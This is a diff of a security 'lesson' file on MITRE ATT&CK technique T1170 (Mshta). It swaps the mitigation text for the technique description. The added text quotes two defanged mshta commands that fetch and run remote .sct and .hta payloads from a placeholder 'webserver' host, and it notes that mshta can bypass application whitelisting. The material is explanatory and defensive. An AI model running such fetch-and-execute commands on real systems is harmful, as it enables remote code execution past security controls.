@@ -1,10 +1,12 @@
-# T1170 Mshta Mitigation Outcome Lesson
+# T1170 Mshta Outcome Lesson
 
 ## Authoritative description
 
-- Technique: **T1170 — Mshta Mitigation**
+- Technique: **T1170 — Mshta**
+- Tactics: stealth, execution
+- Platforms: Windows
 
-Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life. Use application whitelisting configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries.
+Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")")) They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.
 
 ## Reusable lesson
 
@@ -21,7 +23,7 @@ This technique should be treated as an explicit review question when it is relev
 ## Source
 
 - MITRE ATT&CK: https://attack.mitre.org/
-- T1170: https://attack.mitre.org/mitigations/T1170
+- T1170: https://attack.mitre.org/techniques/T1170
 - Reviewed: 2026-10-27
 
 ## Boundary
